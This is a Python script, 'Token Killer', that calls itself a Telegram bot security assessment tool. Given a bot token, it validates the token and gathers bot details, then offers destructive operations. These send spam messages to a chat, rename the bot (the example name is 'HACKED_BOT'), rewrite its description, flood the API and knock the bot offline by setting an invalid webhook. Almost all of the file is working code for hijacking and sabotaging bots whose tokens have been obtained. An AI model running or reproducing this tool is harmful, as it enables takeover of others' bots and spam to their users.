#!/usr/bin/env python3
"""
Token Killer - Professional Telegram Bot Security Assessment Tool
Author: Senior Python Developer
Version: 1.0
"""

import asyncio
import aiohttp
import json
import random
import string
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional
import argparse
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class TokenKiller:
    def __init__(self, token: str):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.session = None
        self.bot_info = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def print_banner(self):
        banner = f"""
{Fore.RED}
▓█████▄  ▒█████   ██▓███   ██▀███   ██▓ ██▒   █▓ ▄▄▄       ██▀███  
▒██▀ ██▌▒██▒  ██▒▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▒████▄    ▓██ ▒ ██▒
░██   █▌▒██░  ██▒▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒██  ▀█▄  ▓██ ░▄█ ▒
░▓█▄   ▌▒██   ██░▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░░██▄▄▄▄██ ▒██▀▀█▄  
░▒████▓ ░ ████▓▒░▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░   ▓█   ▓██▒░██▓ ▒██▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░   ▒▒   ▓▒█░░ ▒▓ ░▒▓░
 ░ ▒  ▒   ░ ▒ ▒░ ░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░    ▒   ▒▒ ░  ░▒ ░ ▒░
 ░ ░  ░ ░ ░ ░ ▒  ░░         ░░   ░  ▒ ░     ░░    ░   ▒     ░░   ░ 
   ░        ░ ░              ░      ░        ░        ░  ░   ░     
 ░                                              ░                   
{Style.RESET_ALL}
{Fore.YELLOW}Telegram Bot Security Assessment Tool v1.0{Style.RESET_ALL}
{Fore.CYAN}Developed for educational and penetration testing purposes{Style.RESET_ALL}
        """
        print(banner)

    async def validate_token(self) -> bool:
        """Validate Telegram bot token"""
        print(f"{Fore.CYAN}[+] Validating token...{Style.RESET_ALL}")
        
        try:
            async with self.session.get(f"{self.base_url}/getMe") as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('ok'):
                        self.bot_info = data['result']
                        print(f"{Fore.GREEN}[✓] Token is valid!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Bot: @{self.bot_info['username']} ({self.bot_info['first_name']}){Style.RESET_ALL}")
                        return True
                else:
                    print(f"{Fore.RED}[✗] Invalid token or API error{Style.RESET_ALL}")
                    return False
                    
        except Exception as e:
            print(f"{Fore.RED}[✗] Validation failed: {str(e)}{Style.RESET_ALL}")
            return False

    async def get_bot_info(self) -> Dict:
        """Get comprehensive bot information"""
        print(f"\n{Fore.CYAN}[+] Gathering bot information...{Style.RESET_ALL}")
        
        endpoints = [
            '/getMe',
            '/getWebhookInfo',
            '/getUserProfilePhotos?user_id={}',
        ]
        
        info = {}
        
        for endpoint in endpoints:
            try:
                if '{}' in endpoint:
                    if self.bot_info:
                        endpoint = endpoint.format(self.bot_info['id'])
                
                async with self.session.get(f"{self.base_url}{endpoint}") as response:
                    if response.status == 200:
                        data = await response.json()
                        endpoint_name = endpoint.split('?')[0][1:]
                        info[endpoint_name] = data
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Error fetching {endpoint}: {str(e)}{Style.RESET_ALL}")
        
        # Display information
        if 'getMe' in info:
            bot_data = info['getMe']['result']
            print(f"{Fore.GREEN}[✓] Bot Information:{Style.RESET_ALL}")
            print(f"    ID: {bot_data['id']}")
            print(f"    Username: @{bot_data['username']}")
            print(f"    First Name: {bot_data['first_name']}")
            print(f"    Can Join Groups: {bot_data.get('can_join_groups', 'N/A')}")
            print(f"    Can Read Messages: {bot_data.get('can_read_all_group_messages', 'N/A')}")
            print(f"    Supports Inline: {bot_data.get('supports_inline_queries', 'N/A')}")
        
        if 'getWebhookInfo' in info:
            webhook_data = info['getWebhookInfo']['result']
            print(f"\n{Fore.GREEN}[✓] Webhook Information:{Style.RESET_ALL}")
            print(f"    URL: {webhook_data.get('url', 'Not set')}")
            print(f"    Has Custom Certificate: {webhook_data.get('has_custom_certificate', False)}")
            print(f"    Pending Update Count: {webhook_data.get('pending_update_count', 0)}")
        
        return info

    async def webhook_operations(self, action: str, url: str = None) -> bool:
        """Manage webhook operations"""
        print(f"\n{Fore.CYAN}[+] Webhook Operation: {action}{Style.RESET_ALL}")
        
        try:
            if action == "info":
                async with self.session.get(f"{self.base_url}/getWebhookInfo") as response:
                    data = await response.json()
                    print(f"{Fore.YELLOW}[!] Webhook Info: {json.dumps(data, indent=2)}{Style.RESET_ALL}")
                    return True
                    
            elif action == "set" and url:
                async with self.session.post(f"{self.base_url}/setWebhook", 
                                           data={"url": url}) as response:
                    data = await response.json()
                    if data.get('ok'):
                        print(f"{Fore.GREEN}[✓] Webhook set successfully: {url}{Style.RESET_ALL}")
                        return True
                    else:
                        print(f"{Fore.RED}[✗] Failed to set webhook: {data.get('description')}{Style.RESET_ALL}")
                        return False
                        
            elif action == "delete":
                async with self.session.post(f"{self.base_url}/deleteWebhook") as response:
                    data = await response.json()
                    if data.get('ok'):
                        print(f"{Fore.GREEN}[✓] Webhook deleted successfully{Style.RESET_ALL}")
                        return True
                    else:
                        print(f"{Fore.RED}[✗] Failed to delete webhook{Style.RESET_ALL}")
                        return False
                        
        except Exception as e:
            print(f"{Fore.RED}[✗] Webhook operation failed: {str(e)}{Style.RESET_ALL}")
            return False

    async def load_testing(self, requests_count: int = 100, concurrency: int = 10):
        """Perform load testing on bot API"""
        print(f"\n{Fore.CYAN}[+] Starting load testing...{Style.RESET_ALL}")
        print(f"    Requests: {requests_count}, Concurrency: {concurrency}")
        
        start_time = time.time()
        successful_requests = 0
        failed_requests = 0
        
        async def make_request(session, request_id):
            nonlocal successful_requests, failed_requests
            try:
                async with session.get(f"{self.base_url}/getMe") as response:
                    if response.status == 200:
                        successful_requests += 1
                    else:
                        failed_requests += 1
            except:
                failed_requests += 1
        
        # Create tasks for concurrent requests
        tasks = []
        for i in range(requests_count):
            task = make_request(self.session, i)
            tasks.append(task)
            
            # Control concurrency
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
                print(f"    Progress: {successful_requests + failed_requests}/{requests_count}", end='\r')
        
        # Gather remaining tasks
        if tasks:
            await asyncio.gather(*tasks)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n{Fore.GREEN}[✓] Load testing completed!{Style.RESET_ALL}")
        print(f"    Successful: {successful_requests}")
        print(f"    Failed: {failed_requests}")
        print(f"    Duration: {duration:.2f} seconds")
        print(f"    Requests/sec: {requests_count/duration:.2f}")

    async def spam_messages(self, chat_id: str, message_count: int = 10):
        """Demonstrative spam message sending"""
        print(f"\n{Fore.CYAN}[+] Starting spam message demonstration...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] WARNING: This is a destructive operation for demonstration only!{Style.RESET_ALL}")
        
        messages = [
            "Security Test Message",
            "Penetration Testing Demo",
            "Bot Vulnerability Assessment",
            "Token Killer Security Check",
            "Educational Purpose Only"
        ]
        
        sent_count = 0
        
        for i in range(message_count):
            message = f"{random.choice(messages)} #{i+1}"
            
            try:
                async with self.session.post(f"{self.base_url}/sendMessage", 
                                           data={"chat_id": chat_id, "text": message}) as response:
                    if response.status == 200:
                        sent_count += 1
                        print(f"    Sent: {message}"[:50] + "...")
                    else:
                        print(f"{Fore.RED}[!] Failed to send message {i+1}{Style.RESET_ALL}")
                        
                await asyncio.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"{Fore.RED}[!] Error sending message: {str(e)}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[✓] Sent {sent_count}/{message_count} messages{Style.RESET_ALL}")

    async def modify_bot_profile(self, new_name: str = None, new_description: str = None):
        """Modify bot profile (demonstrative)"""
        print(f"\n{Fore.CYAN}[+] Attempting to modify bot profile...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] WARNING: This is a destructive operation!{Style.RESET_ALL}")
        
        try:
            # Change bot name
            if new_name:
                async with self.session.post(f"{self.base_url}/setMyName", 
                                           data={"name": new_name}) as response:
                    data = await response.json()
                    if data.get('ok'):
                        print(f"{Fore.GREEN}[✓] Bot name changed to: {new_name}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[✗] Failed to change bot name{Style.RESET_ALL}")
            
            # Change bot description
            if new_description:
                async with self.session.post(f"{self.base_url}/setMyDescription", 
                                           data={"description": new_description}) as response:
                    data = await response.json()
                    if data.get('ok'):
                        print(f"{Fore.GREEN}[✓] Bot description updated{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[✗] Failed to change bot description{Style.RESET_ALL}")
                        
        except Exception as e:
            print(f"{Fore.RED}[✗] Profile modification failed: {str(e)}{Style.RESET_ALL}")

    async def stop_bot_via_webhook(self):
        """Stop bot by setting invalid webhook (demonstrative)"""
        print(f"\n{Fore.CYAN}[+] Attempting to stop bot via webhook...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] WARNING: This is a destructive operation!{Style.RESET_ALL}")
        
        invalid_url = "https://invalid-url-that-does-not-exist.local"
        
        try:
            async with self.session.post(f"{self.base_url}/setWebhook", 
                                       data={"url": invalid_url}) as response:
                data = await response.json()
                if data.get('ok'):
                    print(f"{Fore.GREEN}[✓] Invalid webhook set successfully{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[!] Bot may stop receiving updates{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[✗] Failed to set invalid webhook{Style.RESET_ALL}")
                    return False
                    
        except Exception as e:
            print(f"{Fore.RED}[✗] Webhook attack failed: {str(e)}{Style.RESET_ALL}")
            return False

def print_usage():
    """Print usage information"""
    print(f"""
{Fore.CYAN}Usage:{Style.RESET_ALL}
  python token_killer.py <token> [options]

{Fore.CYAN}Examples:{Style.RESET_ALL}
  python token_killer.py 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --validate --info
  python token_killer.py 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --load-test --requests 50
  python token_killer.py 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --spam --chat-id 12345 --count 5
  python token_killer.py 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --destructive --new-name "HACKED_BOT"

{Fore.CYAN}Options:{Style.RESET_ALL}
  --validate           Validate bot token
  --info               Get comprehensive bot information
  --webhook-info       Get webhook information
  --set-webhook URL    Set webhook URL
  --delete-webhook     Delete webhook
  --load-test          Perform load testing
  --requests COUNT     Number of requests for load testing (default: 100)
  --concurrency COUNT  Concurrency level for load testing (default: 10)
  --spam               Send spam messages (demonstrative)
  --chat-id ID         Target chat ID for spam
  --count COUNT        Number of messages to send (default: 10)
  --destructive        Perform all destructive operations (USE WITH CAUTION)
  --new-name NAME      New bot name for modification
  --new-desc DESC      New bot description for modification
    """)

async def main():
    parser = argparse.ArgumentParser(description='Token Killer - Telegram Bot Security Assessment Tool')
    parser.add_argument('token', nargs='?', help='Telegram Bot Token')
    parser.add_argument('--validate', action='store_true', help='Validate token')
    parser.add_argument('--info', action='store_true', help='Get bot information')
    parser.add_argument('--webhook-info', action='store_true', help='Get webhook info')
    parser.add_argument('--set-webhook', help='Set webhook URL')
    parser.add_argument('--delete-webhook', action='store_true', help='Delete webhook')
    parser.add_argument('--load-test', action='store_true', help='Perform load testing')
    parser.add_argument('--requests', type=int, default=100, help='Number of requests for load testing')
    parser.add_argument('--concurrency', type=int, default=10, help='Concurrency level')
    parser.add_argument('--spam', action='store_true', help='Send spam messages')
    parser.add_argument('--chat-id', help='Target chat ID for spam')
    parser.add_argument('--count', type=int, default=10, help='Number of messages')
    parser.add_argument('--destructive', action='store_true', help='Perform destructive operations')
    parser.add_argument('--new-name', help='New bot name')
    parser.add_argument('--new-desc', help='New bot description')
    
    args = parser.parse_args()
    
    # If no arguments provided, show usage
    if len(sys.argv) == 1:
        print_usage()
        return
    
    if not args.token:
        print(f"{Fore.RED}[!] Error: Bot token is required{Style.RESET_ALL}")
        print_usage()
        return
    
    async with TokenKiller(args.token) as tk:
        tk.print_banner()
        
        # Validate token first (if not doing just destructive ops)
        if not args.destructive:
            if not await tk.validate_token():
                return
        
        # Perform requested operations
        if args.validate:
            await tk.validate_token()
        
        if args.info:
            await tk.get_bot_info()
        
        if args.webhook_info:
            await tk.webhook_operations("info")
        
        if args.set_webhook:
            await tk.webhook_operations("set", args.set_webhook)
        
        if args.delete_webhook:
            await tk.webhook_operations("delete")
        
        if args.load_test:
            await tk.load_testing(args.requests, args.concurrency)
        
        if args.spam:
            if not args.chat_id:
                print(f"{Fore.RED}[!] Error: --chat-id is required for spam{Style.RESET_ALL}")
                return
            await tk.spam_messages(args.chat_id, args.count)
        
        if args.destructive:
            print(f"\n{Fore.RED}[!] STARTING DESTRUCTIVE OPERATIONS{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] USE WITH CAUTION - THESE CHANGES ARE REAL{Style.RESET_ALL}")
            
            # Perform all destructive operations
            await tk.stop_bot_via_webhook()
            await tk.modify_bot_profile(args.new_name, args.new_desc)
            if args.chat_id:
                await tk.spam_messages(args.chat_id, 5)
        
        elif args.new_name or args.new_desc:
            await tk.modify_bot_profile(args.new_name, args.new_desc)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operation cancelled by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {str(e)}{Style.RESET_ALL}")
